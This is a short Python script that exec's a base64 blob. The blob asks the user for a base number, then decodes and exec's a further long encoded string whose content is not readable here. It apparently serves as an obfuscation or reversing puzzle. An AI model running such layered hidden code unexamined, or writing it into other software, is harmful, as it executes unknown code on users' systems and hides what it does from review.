from base64 import *
from os import *
from sys import *
exec(b64decode("aW1wb3J0IGJhc2U2NAoKYiA9IGludChpbnB1dCgiYmFzZSA/IGRlY29kZT8gIikpCgpleGVjKGdldGF0dHIoYmFzZTY0LCBmImJ7Yn1kZWNvZGUiKSgiTVY0R0tZWklNSTNESVpERk1OWFdJWkpJRUpORzRTVFdNSkpVRU1EQks0WVdZU0tITlIyR0dSWlpQRlNFR1FUMk1KRFZNM0RESUZZRzJZU0RJRTRVU1IzTU9WUlVRVlJRSk5CVVVXREJJNUREQVNLSEtKM0VTU0RNT1pTRkdRUlFNRkRXWTVMQlBGQkRBWUtIS1ZUVlUzTFlOQk5IU1FUUU1ONURTWTNDTkZFWEFRM09KWlpWVVYyV081RlVJUUxWSlpCV1dTM0RKQkZIQVlUT0tGWFVTMjNJT1JSRkdTTFFJTlhFNDQyMks1TEhPUzJFSVYyVTQyTExKTlJVUVNUUU1KWEZDMzJKTk5WV09aQ0hOQllHRTNMVE01U1ZPT0pSSklaVVUzQ0pKQlNIU1lSU0dWWEVZUTJDTkZTRlFVTEhNSkRWTU1DS0dOR1dPWkNJSkkyVVNSMkdPVlNWUVpESU1WTUUyMktMS0ZZR1laS0hLWlZFV1IySkdKSEVPVVRNTEVaRFMyMjJLTlRXU1dLV01ONEdJTVNKUEpKV1VRU0tLTkRFVTUyWk5SU0ZNVVpTSlpFVkczU0NORlJHWVJUV0tOTFhJTkRFTlJXRlFWTE9JSlVXRVYyT09CS0VLVFNETUpEVVU1Q1ZLUldFVVlLVk5SNUZHVkxFTUZSVEVVU1pLUldUU1VLV05SRkRLV1NHTVJMR0dSS09PUkxXNFdUS01GS1VVNTJUS1ZTSEdaQ1ZOUkVWRzNMSU5GUkZPVVRUS01ZRkVWVERJVTRXNFlSU01SRkZHUlNLTzVNV1laQ1dNUkxVMjZMRkk1NEdDVjJGSVozRklWM01PWlJWT1JTVU1FWUhJU1NSR0JGREdXSlNHRlpXSVYyU0lSTkRFM0NOTUZLV1k2U1RLVlNGT1pDV09CQ1UyUjNNSkpRVlFaRE9LNVdUQ05DTks1R1hTV1QyTlJMVkdSTFBQQkxXWVRUU0tNWkZFU0RDSkJKR0NWTDJLWTNGUzIzRUs1UkVPVFNFTEo1RU1UQ1ZMQkJER1dKU0dGWldJVjJTSVJOREUzQ1RLSjVHWU1LWE5SSEVNWUtWT1JKR0dTREVOSlJGTzZCUkxKQ1U0M1RCS1pGSElaS0hOQlFVMlJKVk9aTFdZWkNQTU5XSEFXS1RLNVNHV1lMTEtZWVZJVktOR0JHVks2Q1pLUldYUVdTTkdGTkRLVjNNSlpGR0dSS09PVklXNDNESUtaNUZLNTJUR0JIRVdZS1hLWktGQzIyV0xKTFVLMzMyTEZMR0dNREJLVjJGRVkySFBCV0ZFTUsyT0ZKVEFaQ0tKVlZUS1NDVk5WNEZVVExLTlJaRk8zQ09OWlFWTTNDWExKREhBWUtOSTU0RENWM0xOQkJXQ1YyR0taUkVPTksyS1pXVTI1MlhOSkZFNlUySEtaRUdDUjNVS05HVlFRTFpLNUtFUzUzRUdBMlhFVkRPSUpKRk1NU1NPRktUQVZUWE1RWVdZNUNPS1pGR1NUS0hQQjVGUzIzSU1GUVRDVkxYS05YRU1XQ1dOVkdYT1dMTkdGSlZFUlNHT1ZSRU81Q1hNVldFVTVLWE5OTEdXWVJTSlpFRkkyU1dLSlJHWTREUUxGTEZNUzJYS1pXRk9XTDJJWlVFMjIzTUdaTFdXMkRYS05XRks1MlROUk5GVVRMS0taNFZPMlNHS05MVU1TVFVNTkRGTVRTV0tSREhLVjJXTEpWRTJWMldPUktXVzJDWE1KTFdRMkNWS1JCSEdaQlJJVjRVMlZURU5KR1dXV1NaS1lZV0kyMlROVkZGT1UzTkhGTkUyMlNXT0pNVEFaQ0xNTkRFNFdDMkk1VUZPWkxNSkoyVk9WQ0NOTkhFT1JTSUtWVldRV0RDTlJZSENXTE1LSkJFMjNDRlBGUkVLU1RCSlZWVEtTU1ZHSTJVR1lLWEpKWlZFM1MyS1JMREcyRDJMSkRUQ1UyV0laREhJWTJHT0JMV0szQ0tHRkxXV1ZTUEtFWkZNV0NWTlJVRTZVUlNLSlpGSzJTS041U0RDMjMyTUpDVTQyM0NLVllIT1ZLWE9NWVZPM0NaTzVIRk1SU1hLNURYUVIyWE5KREdDVTJXSlpZVk0yM1FLTkxVTzJCVEs1TFRBTUtXR0EyVU1ZU0ZOQlVWR1JTMk9GS0ZJUlNMTU1ZV0lWMjJJWkZHUVZTWUtKSlZTTURFR1JRVk1TTFpNVkVGRVZDV0tVMlVZV0wySkpEVk9SSlZLVkpHMjZDU0pWRFhRNUtYS1pOR1VUS0dONTRWSTIzSU5SSkRFMkRTS1ZWRU01Mk5OUlZYU1RLSU1SSFdDTUJWTzVLVk1aRExNRldFNFJUREpCU0ZVWVNVS1pKVlMyU0NPTlJURVNTSks1V1hJVlNOSVZZSFFWUlJMSlZFMlIyS09SS1dXVVNTTUpXWFE0U1dOWllGR1lUTU9CREZVUlpaTkpKREFOQlJLVkxUS1lMQks1REZNVTNMR1ZORk0zS05QQktGTVpDWEtKREVVV0MySVpTRklVU1hIQjRGS01LV01GUVRFVFNJS05YRkVWVENOUllIRVZDVUlGNEdFM0RNSzVNWFVSVE1NSkxFVVNLV05VWVc2V0tXSVYzV0VTREVLSkdXVVJTWUxGNUVVVFRGS1pORktWM0xLSlVGTVZLMk9WTFZJUVRQS01aRTRTQ1ROWkxGTVZUMk5SRlZTMjNFR1JHV1k0Q0hLUlZVNDJEQ0k1NEZTVkRMTU1ZV0NNS0ZPNUpXVVZUQktKV1UyNTJYTkpGRkdVMkhJWkVWQzNMUU5STEZLMzNaSzVMVEM0MlJHSkpIR1lTSUtaS1dFV0NDT0pMREFWVFhNTVlVNFZUQklWSEdVVEtYUEJORk1WWlFQQlFWS01EWE1OQ0VFV1NOR0o0RU9WM0tJWlFWR1ZTT09GTEdXNENUSlZYR1FVU1dOUlVIR1VKU0paRUZHM1NXS1ZRV1dTVElLWlZFRVlMRE5SSEZRWVNJSkpLRTJXQ0NMSk1WSzJDRE1FWVVLNksySVJIRklUS1ZMSVpWUzIzRUs1SlVNV1RVTU5DWFFVMk5JNTJES1ZTSE9SVlZLTVNLSTVRVEczQ1FLWVpWRTJDV0tSRkdXWTJHTVJLVkMzSlpLUkdXV05LSktVWkRLVjJXTlJORE1ZU0ZPUk5HQ01MUUpSTkVPNkRMS1laRU1SMlROVldHU1ZTVUtGNEZNVlMyTkpIRk9STFlLTlZGVTJDTkdKSkZTVlROR0ZKRTJSVE1HWkpXWVpDWEtJWUZNTktYTk5TSEdZS1dMSkVHSVJDT0taR1ZNV1RXS1pLRVVTVEZJNUhFT1ZMTUpKVVZNUksyTzVMRk80Q0RMRkxWRVYyVU5SU0ZLWUpUSUpVRklWM1VNRkxWTVdMWUxKRFhJMkNTTlJYVEVWVE5PQkhWU1ZTS09SUVVNVFMyTUZWVVM1MldOTk5FT1ZTWEpKRFZFM0MySlpKRk00QlRLWVpISVUyVUdKRVhTVkxMTVJVRTJNMkNLNU1XWVVTSE1NWVhBV0REUEpCRTRVVE1KSkxGS01UVEdWTVZPU1NXSlZLRk1XREJOTTJUR1dLV01SRFdHTUtPT0ZKR1lWU1hNSkxFVTZDV0laTEdXVVpTSlpMVk8zU0dORkpGUVFUUEtaV0ZNNTNGTlJTRlFaQ0hIRktVMjIzUUk1TVdXVlNUS1pEVVVSMlhOVTRWTVlMTEpKUVZVUkNHSjVSVk1VVFNKWkxVTVRUQkdOQVhPVlNFSVpKVkNNS09PTktHV1pDVU1KV0hBV0taTk5LVENVU0dOUlpWVVJMVUtSSkdXNEJRS1JXRk01M0JJWk1YVVZDVUtaS0ZNTVRZUEZNVEFUU0tNTkNYSVVTUUtRWUdTUzJUTk02U0VLSkpFQT09PT09PSIpKQ=="))